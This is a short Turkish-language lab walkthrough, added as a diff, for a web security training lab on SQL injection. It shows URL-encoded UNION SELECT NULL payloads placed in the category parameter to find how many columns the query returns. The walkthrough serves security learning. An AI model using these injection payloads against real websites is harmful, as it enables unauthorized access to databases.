@@ -1,0 +1,10 @@
+LAB: SQL injection UNION attack, determining the number of columns returned by the query
+
+1 - Herhangi bir kategoriyi seçiyoruz.
+https://<YOUR-LAB-ID>.web-security-academy.net/filter?category=Clothing%2c+shoes+and+accessories
+
+2 - category parametresindeki değeri '+UNION+SELECT+NULL-- ile değiştiriyoruz.
+https://<YOUR-LAB-ID>.web-security-academy.net/filter?category=%27+UNION+SELECT+NULL--
+
+3 - Hata mesaji gidene kadar NULL ekliyoruz.
+https://<YOUR-LAB-ID>.web-security-academy.net/filter?category=%27+UNION+SELECT+NULL,NULL,NULL--
